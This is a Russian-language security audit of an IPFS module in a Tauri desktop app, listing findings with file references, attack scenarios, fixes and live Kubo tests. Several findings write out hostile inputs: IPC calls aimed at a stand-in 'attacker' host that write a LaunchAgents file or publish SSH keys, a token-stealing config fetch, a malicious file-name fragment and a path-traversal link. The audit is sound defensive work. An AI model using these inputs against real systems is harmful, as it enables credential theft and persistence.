# IPFS-модуль — аудит логики и безопасности

Дата: 2026-09-11. Scope: Ф0–Ф5c (коммиты `825c1d3`…`ee1e8d4`) + незакоммиченные
правки этого дня (подпись ecpair/btc17, subdomain-ссылки, выпадашка песочных
часов, перенос удаления Kubo в настройки).

Метод: три независимых read-only ревью (Rust-бэкенд, фронт, дневной diff) +
ручная сверка ключевых мест. В списке только то, что подтверждено чтением кода
(или запуском парсера на Node). Приоритет — по реальному ущербу, а не по
формальной категории.

Статус: `[ ]` открыто · `[x]` починено · `[~]` осознанно принято.

**2026-09-11, вечер: все пункты B/C/D закрыты в рабочем дереве (не закоммичено);**
**сводка правок и живая проверка Kubo — в разделе G.** Хэши проставить при коммите.

---

## A. Модель угроз (кратко, чтобы приоритеты были понятны)

1. **Недоверенный HTML в окне-просмотрщике** (`ipfs-<ns>-<root>`), загружаемый с
   `http://127.0.0.1:<gw>` или `https://dweb.link`. У него **нет Tauri IPC**
   (capability `windows:["main"]` — проверено, включая `gen/schemas`). Единственный
   канал — обычный HTTP на loopback.
2. **XSS в главном окне** (посты рендерятся через `v-html` в 29 местах, есть
   `sanitizeHtml`). Любой обход санитайзера = полный IPC, включая наши команды.
3. **Локальный процесс/пользователь** той же машины — Kubo RPC без auth на loopback.
4. **Автор вредоносной ссылки** (пост, коммент, ЛС) — управляет `href`, фрагментом
   `#key=&name=`, засеянным CID.
5. **Сетевой наблюдатель / провайдер контента** при включённом Tor.

---

## B. Критично / высоко

### B1. `[x]` Раздача файлов не работает: опубликованный CID никто не найдёт
- `src-tauri/src/ipfs/config.rs:55-59` — `Provide.Enabled=false`; после `ipfs add`
  (`mod.rs:270-281`) provide не вызывается.
- Сценарий: «Поделиться файлом» → ссылка `ipfs://<cid>` → у получателя (и на
  dweb.link) «not found», пока не настроен удалённый pin (Ф5c). Дизайн-док исходил
  из «провайдер-записи протухают за сутки» — их нет вообще.
- Фикс (Kubo v0.43): `Provide.Enabled=true` + `Provide.Strategy=pinned` —
  анонсировать только явно запиненное (свои файлы), не чужой кэш. Исходная правовая
  цель («не раздавать чужое») сохраняется. Плюс явный `ipfs routing provide <cid>`
  сразу после `add`, чтобы не ждать интервала.

### B2. `[x]` «Локальная нода = приватно» под Tor — неверно, утечка больше, чем через dweb.link
- `src/locales/{ru,en}.ts` `ipfsTorBlockedContent`; `use-ipfs-links.ts:71`,
  `:114-119`; `config.rs` — Kubo без SOCKS/Tor-транспорта.
- Сценарий: Tor включён, ссылка открыта через локальную ноду → Kubo дозванивается
  DHT/bootstrap/Bitswap-пиров напрямую → реальный IP и **запрашиваемый CID** видны
  десяткам третьих сторон (в т.ч. атакующему, который засеял CID). Окно-просмотрщик
  создаётся без `proxy_url` → `<img src="https://attacker/px">` внутри IPFS-страницы
  уходит с реального IP.
- Фикс: при `torActive` **не открывать вообще** (ни local, ни public) с честным
  текстом «IPFS не торифицирован»; либо (сложно) `proxy_url` на окно + SOCKS для
  Kubo (`Swarm.Transports` не умеет SOCKS — реалистично только запрет).

### B3. `[x]` Tor-guard читает устаревший снимок `torOn`
- `use-ipfs-links.ts:64` (`const torOn = store.torActive`) — до `await
  resolveGateway()` (consent + установка до 10 мин); проверки на `:71` и `:100`
  используют снимок.
- Сценарий: Tor bootstrapping → клик → «Установить» → Tor стал `ready` во время
  скачивания → «Через публичный шлюз» → `resolveGateway()` вернул dweb.link →
  guard пропускает → окно грузит dweb.link с реального IP.
- Фикс: читать `store.torActive` **после** каждого await (перед `showTorBlocked`
  и перед fallback), не кешировать.

### B4. `[x]` IPC-команды принимают произвольные пути/URL без валидации
- `mod.rs:270` `ipfs_add(path)`, `:293` `ipfs_add_encrypted(path)` — чтение любого
  файла и публикация (+ `pinRemote` на внешний сервис, `ipfs-store.ts:266`).
- `mod.rs:332-356` `ipfs_save_encrypted(gateway, cid, key, dest)` — SSRF на любой
  хост из Rust + **запись произвольных байт по любому пути** (первый в приложении
  примитив произвольной записи; `save_temp_file` пишет только в temp).
- Сценарий (при XSS в main): `invoke('ipfs_save_encrypted', {gateway:'https://attacker',
  cid:'x', key:K, dest:'~/Library/LaunchAgents/x.plist'})` → persistence/RCE.
  `invoke('ipfs_add', {path:'~/.ssh/id_ed25519'})` → CID → чтение через
  `http://127.0.0.1:<gw>/ipfs/<cid>` (CSP `connect-src http://*` разрешает).
- Обходит `fs:scope-download` — это кастомные команды. Для калибровки: в `lib.rs`
  уже есть неограниченный `read_file(file_path)` — чтение не новый класс, запись —
  новый.
- Фикс (защита в глубину): `gateway` — только `localBase`/`IPFS_GATEWAY` (белый
  список в Rust, не строка с фронта); `dest`/`path` — открывать диалог **из Rust**
  (`tauri-plugin-dialog` blocking API) и не принимать путь из JS; либо минимум —
  `dest` только под `~/Downloads`/выбранной папкой, `path` — проверка на существующий
  regular file.

### B5. `[x]` Kubo RPC достижим из окна-просмотрщика (и любым локальным процессом)
- `config.rs:60-66` — `Access-Control-Allow-Origin=[]` это дефолт Kubo, он всё
  равно дописывает `http://127.0.0.1:<api>`, `localhost`, `[::1]`; API-порт сам
  обслуживает `/ipfs`, `/ipns` (для webui); `API.Authorizations` не задан; в
  `lib.rs` нет `on_navigation` для viewer-окон.
- Сценарий: страница в viewer-окне сканирует loopback-порты из браузера, находит
  API-порт, переходит на `http://127.0.0.1:<api>/ipfs/<cid2>`, оттуда same-origin
  `fetch('/api/v0/config/show')` → **читает pin-токен**
  (`Pinning.RemoteServices.bastyon-pin.API.Key`); `/api/v0/config` →
  `Addresses.API=/ip4/0.0.0.0/tcp/5001` (вступит в силу на следующем старте);
  `pin/remote/add`, `shutdown`.
- Фикс: (1) `API.Authorizations` — bearer-секрет, генерируем в Rust при init,
  храним в `$IPFS_PATH`-соседе с 0600, все `run_ipfs`/probe-запросы с
  `Authorization`; (2) viewer-окна создавать **из Rust** с `on_navigation`: только
  `http://127.0.0.1:<gw-port>` и `https://*.dweb.link`; (3) `incognito: true` для
  viewer-окон (см. C4).

### B6. `[x]` Subdomain-регэксп перехватывал обычные сайты и ломал path-ссылки
- Было: `/^(.+?)\.(ipfs|ipns)\./` до path-формы → `docs.ipfs.tech` перехватывался
  (preventDefault + consent-модалка), `gateway.ipfs.io/ipfs/<cid>` → 404.
- Починено (в рабочем дереве): path-форма первой; subdomain только для первой
  метки хоста и только CID-подобной (`b[a-z2-7]{20,}` / `k[a-z0-9]{20,}`) или
  инлайн-DNSLink с раз-инлайниванием (`--`→`-`, `-`→`.`). Тесты 43/43.

---

## C. Средне

### C1. `[x]` Имя файла из приватной ссылки уходит в save-диалог без санитизации
- `use-ipfs-links.ts:39` `save({ defaultPath: secret.name })`; `parseIpfsSecret`
  декодирует как есть. Для content-disposition есть `sanitizeFilename`
  (`ipfs-content.ts:73-82`), для encrypted — нет.
- Сценарий: `#key=…&name=/Users/<u>/.ssh/authorized_keys` → plugin-dialog делает
  `set_directory(parent)+set_file_name(file)` → диалог открыт сразу в `~/.ssh` с
  этим именем → «Save» → Rust пишет выбранный атакующим plaintext.
- Фикс: `sanitizeFilename(secret.name)` + отбрасывать всё до последнего `/`;
  `defaultPath` только basename (диалог сам подставит Downloads).

### C2. `[x]` Усыновлённый демон (`try_attach`) невидим для update/uninstall/exit
- `mod.rs:238-261`, `:214-233`, `lib.rs:742-747` — гасят только `mgr.child`.
- Сценарии: update при attached → `remove_dir_all(bin_dir)` под живой старой нодой
  → `try_attach` усыновляет её обратно → `installed=true, update_available=false`,
  но бинаря нет (`ipfs_add` → «No such file»); uninstall удаляет repo под живым
  процессом (Windows: `repo.lock` держится → следующий ensure 60 с → Failed);
  `ExitRequested` никогда не останавливает усыновлённого — сирота через все сессии.
- Фикс: хранить не только `child`, но и `api_port` attached-ноды; `stop_any()` =
  child.kill() **или** `POST /api/v0/shutdown` + ждать освобождения порта; звать
  его в update/uninstall/exit.

### C3. `[x]` Зависание навсегда на протухшем `$IPFS_PATH/api`
- `mod.rs:462-475` `try_attach`, `:479-498` `wait_ready`, `:190-194` `ipfs_stop` —
  `reqwest::Client::new()` без таймаута; живость = любой 2xx на `POST /api/v0/id`;
  файлы `api`/`gateway` перед spawn не удаляются.
- Сценарии: порт из устаревшего файла занят процессом, который принимает
  соединение и молчит → `try_attach` висит вечно с удержанным `start_lock` → все
  `ipfs_ensure` ждут, IPFS мёртв до перезапуска; dev-сервер SPA на том же порту →
  «Running» с чужим портом; `wait_ready` при живом API берёт `gateway` из старого
  файла → окно на мёртвый порт.
- Фикс: `.timeout(2s)` на probe; после неуспешного `try_attach` удалять оба файла;
  сверять `ID` из `/api/v0/id` с `Identity.PeerID` репо.

### C4. `[x]` Viewer-окна без `incognito` — общий storage для всех IPFS-сайтов
- `use-ipfs-links.ts:114-119` — `new WebviewWindow(label, { url, … })`.
- Сценарий: все страницы на одном origin `http://127.0.0.1:<gw>` (path-gateway,
  без subdomain-изоляции) → вредоносный IPFS-сайт читает localStorage/IndexedDB/
  cookies другого IPFS-dapp, открытого ранее.
- Фикс: `incognito: true` (Tauri 2 умеет) — эфемерный storage на окно.

### C5. `[x]` Неограниченная память в `ipfs_save_encrypted` / `ipfs_add_encrypted`
- `mod.rs:344-353` `.bytes()` целиком; `:297` `std::fs::read` + шифртекст ещё раз.
- Сценарий: враждебный gateway (см. B4) или огромный CID → гигабайты за 60 с →
  OOM-kill приложения; публикация видео = 2× размер в RAM.
- Фикс: лимит `Content-Length`/стриминг с cap (напр. 512 МБ) → ошибка «слишком
  большой для приватной ссылки»; для add_encrypted — стримовое шифрование или cap.

### C6. `[x]` Свои же шаринг-ссылки `ipfs://` некликабельны в постах
- `sanitize-html.ts:70-76` пропускает только `bastyon://`; автолинк
  `text-formatter.ts:54-55` ловит `bastyon://|https?://|www.`.
- Сценарий: ссылка из «Поделиться файлом» вставлена в пост → просто текст;
  scheme-ветка делегата (`ipfs-link.ts`) для контента мёртвая. (Оговорка: xss-дефолт
  не запускался, вывод по коду санитайзера и его комментарию.)
- Фикс: разрешить `ipfs://`, `ipns://` в `safeAttrValue` + автолинк.

### C7. `[x]` Pending-пост «залипает» в posts-store и затеняет подтверждённый
- `post-card.vue:267-271` `registerPost(props.post)` для `pending:true`;
  `posts-store.ts:52-66` `getPostByShareId(txid)` сначала `posts.get(shareId)`.
- Сценарий: подтверждённый пост регистрируется под числовым id, txid — в
  `txidMap`; `getPostByShareId(txid)` находит старую pending-запись → в
  `use-star-rating.ts:42-47,87-95` `effectiveVotersCount=0` → звёзды/голоса
  показывают 0 до перезагрузки. Pre-existing (через ленту профиля); модалка-превью
  добавила второй триггер.
- Фикс: в `onMounted` не звать `registerPost`, если `props.post.pending`.

---

## D. Низко

### D1. `[x]` `ROOT_RE` пропускает `.`/`..`, `path` не нормализуется
- `ipfs-link.ts` (`ROOT_RE`, `build`). `ipfs://../api/v0/version` →
  `http://127.0.0.1:<gw>/ipfs/../api/v0/version` → WHATWG-нормализация →
  `/api/v0/version` на **gateway**-порту (RPC — на другом порту, GET-only, side-effect
  не найден). Окно с титулом `IPFS · ..…` покажет не-IPFS страницу. Полные URL
  безопасны (`new URL` схлопывает).
- Фикс: `ROOT_RE` без `.`; `path` — отбрасывать сегменты `.`/`..`, `encodeURI`.

### D2. `[x]` Нет проверки `res.ok` в загрузке/пробе
- `ipfs-download.ts:59-63, 80-81`. 504 dweb.link сохраняется как `archive.zip`;
  `probeContent` на 5xx возвращает заголовки → `classify('text/plain')` = render →
  per-CID fallback (`!probed`) не срабатывает на быстрый 4xx/5xx.
- Фикс: `if (!res.ok) return null` в probe; в save — ошибка.

### D3. `[~]` Токен pin-сервиса в argv + endpoint без проверки `https://`
- **Сделано:** `https://` обязателен (Rust), `--` перед позиционными. **Принято:** секрет
  в argv (`--api-auth`, токен pin-сервиса) виден в `ps` на время команды — у Kubo CLI
  нет env/файлового варианта; экспозиция кратковременная, same-host. Уйти от неё
  можно только заменой CLI на прямые RPC-вызовы (reqwest + Authorization) — отдельно.
- `mod.rs:367-391` — виден в `ps`/`/proc/*/cmdline` на время процесса; `http://`
  пройдёт → токен в открытом виде в каждом запросе Kubo к сервису.
- Фикс: требовать `https://` в Rust; передавать ключ через stdin/файл нельзя
  (Kubo CLI не умеет) — принять как `[~]` с пометкой, либо писать
  `Pinning.RemoteServices` прямо в `config` файл (0600).

### D4. `[x]` Позиционные аргументы в `run_ipfs` без `--`
- `mod.rs:271-275, 377-389, 416-427`. Файл `-r` / endpoint `--offline` уйдут как
  флаги → невнятные ошибки. Эксфильтрации через `--api=` не найдено.
- Фикс: `--` перед позиционными.

### D5. `[x]` `stop`/`update`/`uninstall` не берут `start_lock`
- `mod.rs:183-261`. `update` во время распаковки → `ExtractedFileMissing`;
  `stop` во время `wait_ready` → ensure досиживает 60 с и пишет `Failed` поверх `Off`.

### D6. `[x]` `ensure_installed` короткозамкнут на `binary.is_file()`
- `installer.rs:136-138`. Краш посреди `tar.unpack` → усечённый бинарь считается
  установленным → «Exec format error». Самолечение частичное (маркер пишется в
  конце → `update_available=true`).
- Фикс: сверять размер/хэш бинаря или писать в temp + atomic rename.

### D7. `[x]` Смерть демона после готовности не наблюдается
- `mod.rs:50-57, 68-73`, `process.rs:61-72`. После краша Kubo — навсегда `Running`
  с мёртвыми портами; lock-error пишет только `message`, `wait_ready` ждёт 60 с.
- Фикс: `try_wait` в `ipfs_status`/fast-path; при lock-error — сразу `Failed`.

### D8. `[x]` Коллизии `windowLabel` для DNSLink-имён
- `use-ipfs-links.ts:19-22` — удаляет `.`/`-`, режет до 40:
  `en.wikipedia-on-ipfs.org` и `enwikipedia-on-ipfs.org` → один label →
  фокус чужого окна / глушение `inFlight`.
- Фикс: label = `ns` + hash(root) (напр. первые 16 hex sha-1).

### D9. `[x]` Двойной клик во время consent перезаписывает `_cancelResolver`
- `ipfs-store.ts:431-438, 479`. Cancel отпускает только последний; первый ждёт до
  10 мин и потом безусловный `closeModal()` закроет любую модалку (напр.
  `pin-config`). `ensureRunning` при non-running ставит `_lastFailedAt`, но не
  `status='failed'` → `_recentlyFailed()` без cooldown.

### D10. `[x]` Частичный сбой `subscribe()` → двойная подписка `ipfs:state`
- `ipfs-store.ts:155-173`. Упал второй `tauriListen` → `_stateUnlisten` есть,
  `_subscribed=false` → следующий `hydrate()` вешает второй раз. Утечка только при HMR.

### D11. `[x]` Модалка-превью не следит за стором
- `header-events.vue:255-261`, `pending-post-preview-modal.vue:45-47`. Пост
  подтвердился при открытой модалке → она продолжает показывать «в блокчейне ещё нет».
- Фикс: `watch(allPending)` → закрыть или сменить баннер на «опубликовано».

### D12. `[x]` Тест подписи не end-to-end
- `transaction-builder-sign.test.ts` покрывает `Signer`/`checkSignArgs`, но не
  `getSigningData`→`prepareInput`→`trySign`→`encode`→`build()`. Даунстрим проверен
  чтением (все `.equals`/`Buffer.concat` нормализуют), но регрессия не поймается.
- Фикс: тест на реальном `TransactionBuilder` с ecpair v3 и одним p2pkh-входом.

### D13. `[~]` CSP главного окна широкая (pre-existing, не IPFS)
- **Принято** в рамках IPFS-аудита: не наш scope; `connect-src http://*` нужен другим
  фичам (ноды/прокси). Отдельная задача по CSP всего приложения.
- `tauri.conf.json:29` — `script-src 'unsafe-inline' 'unsafe-eval'`, `connect-src
  https://* http://*`. Главное окно может фетчить любой локальный сервис. На
  viewer-окна CSP не действует.

### D14. `[x]` `use-profile-feed.myAuthor` — инлайн-копия хелпера
- `current-user-author.ts` заявляет использование в `use-profile-feed`, но там
  своя копия (`use-profile-feed.ts:63-70`). Дрейфа нет; заменить на хелпер.

---

## E. Проверено и признано безопасным (чтобы не перепроверять)

- Capability `windows:["main"]` — viewer-окна (`ipfs-<ns>-<root>`, alnum-only, не
  совпадает с `main`) без IPC; подтверждено `gen/schemas/capabilities.json`.
- Installer: URL-константа `https://dist.ipfs.tech/kubo/v0.43.0/…`; SHA-512
  запинен в коде и сверяется **до** распаковки/chmod/codesign; mismatch → архив
  удалён; `tar.unpack` отбрасывает `..`/абсолютные; zip через `enclosed_name()`;
  путь бинаря фиксирован из `IpfsPaths`; `codesign`/`xattr` через `.arg()`, без shell.
- `process.rs`/`config.rs`: argv/env демона и значения `ipfs config` — константы;
  API/Gateway `/ip4/127.0.0.1/tcp/0`.
- `crypto.rs`: ключ и nonce из `OsRng`, nonce на каждое шифрование, проверки длины
  до `split_at`/`from_slice` — паник нет.
- Паники на внешних данных в модуле ipfs — нет (`expect` только на отравленном mutex).
- `ExitRequested` для собственного child: SIGTERM → 2 с → SIGKILL; Windows `taskkill /T`.
- URL viewer-окна всегда `http(s)://` из фиксированных баз + `ROOT_RE` — `javascript:`/
  `file:`/`tauri:` недостижимы.
- `ipfsFetch` loopback-детект: обхода Tor к чужому хосту нет (URL строится только из
  фиксированных баз); `127.0.0.1.evil.com` / `127.0.0.1@evil` не проходят.
- Ключ приватной ссылки: Rust проверяет base64 и длину 32 до `from_slice`.
- Рендер `link`/`name`/`store.message` — только `{{ }}`/`t()`; `v-html` в модалке
  идёт через `editorjsToHtml → sanitizeHtml` (тот же путь, что лента).
- Consent в localStorage — same-origin; mini-apps и viewer — другие origin'ы.
- `inFlight` чистится в `finally`; `setFocus()` на закрывающемся окне → no-op.
- Порядок для encrypted под Tor: probe публичного шлюза идёт через `appFetch`
  (торифицируется); утечка только через окно/Kubo (B2).
- Signer/Uint8Array: даунстрим (`getSigningData`, `trySign`, `encode`,
  `payments.p2pkh`) нормализует; PSBT (`psbt.js`) с `.equals` на pubkey из app-кода
  не используется; объектная и позиционная `sign` далее идут одним путём.
- PostCard для `pending`: `SC_PostActions` и `PostCardComments` скрыты
  (`v-if="!post.pending"`) — delete/rate/comment из модалки недостижимы.
- i18n-паритет ru/en по всем новым ключам; геттеры `getUserAddress`/`getUserProfile`
  существуют с такими именами.
- `ipfs-section` на вебе скрыта (`installed=false`, `hydrate` выходит по `!available`);
  Rust `ipfs_uninstall` идемпотентен (двойной клик безвреден).

---

## F. Порядок починки (предложение)

1. **B6** ✅ (уже) · **B3** (10 строк) · **C1** (5 строк) · **C7** (1 строка) · **D2** — быстрые и закрывают реальные утечки/поломки.
2. **B1** — без него фича «файлообмен» не работает; `Provide.Strategy=pinned` + provide после add.
3. **B2** — честный запрет под Tor (текст + guard).
4. **B4 + B5 + C4** — одним заходом: viewer-окно из Rust с `on_navigation` + `incognito`; `gateway` по белому списку; диалоги из Rust; `API.Authorizations`.
5. **C2 + C3 + D5 + D7** — жизненный цикл демона (attach/stop/probe-таймауты/наблюдение).
6. Остальное D — по ходу.

---

## G. Что сделано (2026-09-11) и живая проверка Kubo v0.43.0

Проверено на настоящем бинаре `kubo_v0.43.0_darwin-arm64` (скачан в scratchpad,
демон поднят с нашим конфигом):

- **Конфиг принимается:** `Provide.Enabled=true` + `Provide.Strategy=pinned+entities`
  + `Routing.Type=autoclient` → «Daemon is ready», без ошибок. `ipfs provide once --
  <cid>` → «queued 1 CID(s) for immediate provide». (`routing provide` в v0.43
  уже DEPRECATED — не использовать.)
- **CSRF на RPC из viewer-окна невозможен:** Kubo отвечает **403** на POST с любым
  браузерным `Origin` (в т.ч. `http://127.0.0.1:<gw>`) и даже с одним `Referer`.
  `/ipfs/<cid>` на API-порту → **404** (только `/webui`). Т.е. B5-вектор «страница
  в просмотрщике → RPC» закрыт самим Kubo; оставался вектор «любой локальный
  процесс» (POST без Origin → 200, `config/show` отдаёт всё).
- **`API.Authorizations` работает как ожидалось:** без токена 403, с
  `Authorization: Bearer` 200, CLI требует `--api-auth=bearer:…`, gateway не
  затронут (200).
- **Протухший `api`-файл:** graceful SIGTERM Kubo сам удаляет `api`/`repo.lock`;
  после SIGKILL/краша остаются (в repo пользователя лежали именно такие). CLI при
  этом ведёт себя хорошо (закрытый порт → офлайн + удаляет файл; молчащий порт →
  быстрый EOF) — зависал только наш `reqwest` без таймаута.

Правки по пунктам:

| Пункт | Где | Что |
|---|---|---|
| B1 | `config.rs`, `mod.rs` | `Provide.Enabled=true`, `Provide.Strategy=pinned+entities`; `provide once` в фоне после каждого `add` |
| B2+B3 | `use-ipfs-links.ts`, `header-ipfs.vue`, локали | Под Tor — полный запрет (viewer, шаринг, запуск ноды) с честным текстом; `torActive` перечитывается после каждого await; при включении Tor работающая нода гасится (`watch`) |
| B4 | `mod.rs`, `ipfs-store.ts`, `header-ipfs.vue`, `use-ipfs-links.ts` | Пути/URL из webview не принимаются: `ipfs_add`/`ipfs_add_encrypted` открывают нативный диалог в Rust; `ipfs_save_encrypted(source: local\|public, cid, key, suggested_name)` — URL по белому списку, save-диалог и санитизация имени в Rust, CID-валидация |
| B5 | `mod.rs`, `config.rs`, `state.rs`, `crypto.rs` | `API.Authorizations` (bearer из `app_data/ipfs/api-secret`, 0600, CSPRNG); все CLI-вызовы с `--api-auth`, probe/shutdown с `Authorization` |
| B5+C4 | `mod.rs` (`ipfs_open_viewer`), `capabilities` | Viewer-окно создаёт Rust: `incognito`, `on_navigation` (только наш gateway-порт / `*.dweb.link` https), метка и URL валидируются; из capabilities убраны `allow-create-webview-window`/`allow-set-focus` |
| B6 | `ipfs-link.ts` | path-форма первой; subdomain только CID-подобная метка или инлайн-DNSLink |
| C1 | `mod.rs` (`safe_basename`) | basename + чистка + fallback `<cid16>.bin` |
| C2 | `mod.rs` (`stop_daemon`, `shutdown_on_exit`) | Усыновлённый демон гасится по RPC (+ ожидание закрытия порта) в stop/update/uninstall/exit |
| C3 | `mod.rs` (`probe_client`, `api_peer_id`, `try_attach`) | Таймаут 2 с; живость = JSON с `ID` == `Identity.PeerID` репо; протухшие `api`/`gateway` удаляются |
| C5 | `mod.rs`, `config.rs` | `MAX_ENCRYPTED_BYTES` 512 МБ: проверка размера файла при add, `Content-Length` + потоковое чтение с потолком при save |
| C6 | `sanitize-html.ts`, `text-formatter.ts` | `ipfs://`/`ipns://` разрешены в href и автолинке (+тест) |
| C7 | `post-card.vue` | Pending-пост не регистрируется в posts-store |
| D1 | `ipfs-link.ts` | Корень без `.`/`..`; сегменты пути `.`/`..`/`%2e%2e`/пустые выкидываются (+тесты) |
| D2 | `ipfs-download.ts` | `!res.ok` → probe null / save ошибка (+модалка) |
| D4 | `mod.rs` | `--` перед позиционными везде |
| D5 | `mod.rs` | `start_lock` в stop/update/uninstall |
| D6 | `installer.rs` | «Установлен» = бинарь **и** маркер |
| D7 | `mod.rs`, `process.rs`, `state.rs` | `reap_dead_child` в status/ensure; `lock_error` → wait_ready выходит сразу |
| D8 | `use-ipfs-links.ts` | Метка окна = alnum-префикс + FNV-1a полного корня |
| D9 | `ipfs-store.ts` | Один cancel-промис на всех ждущих; закрывается только своя progress-модалка; non-running снапшот → `failed` (cooldown работает) |
| D10 | `ipfs-store.ts` | Частичная подписка откатывается |
| D11 | `header-events.vue`, модалка, локали | Подтверждение при открытой модалке → баннер «опубликован», бейдж снимается |
| D12 | `transaction-builder-e2e.test.ts` | Настоящий btc17 `TransactionBuilder` + ecpair v3: обе формы `sign()`, подпись верифицируется `ecc.verify`; чужой ключ отвергается |
| D14 | `use-profile-feed.ts` | Общий `buildCurrentUserAuthor` |

Проверки: `cargo check --lib` без предупреждений, `cargo test --lib ipfs::` 24/24;
vitest 2128/2128 (+1 skipped); eslint 0 ошибок по изменённым файлам; `npm run build` ок.

**Не проверено вживую (нужна Tauri-сборка):** нативные диалоги из Rust
(`blocking_pick_file`/`blocking_save_file` из async-команды), `ipfs_open_viewer`
(incognito + on_navigation), полный цикл ensure с `API.Authorizations` на репо
пользователя (первый ensure после апгрейда пропишет Authorizations в существующий
`config`; демон, поднятый ДО апгрейда и усыновлённый, auth не требует — probe с
лишним заголовком проходит).
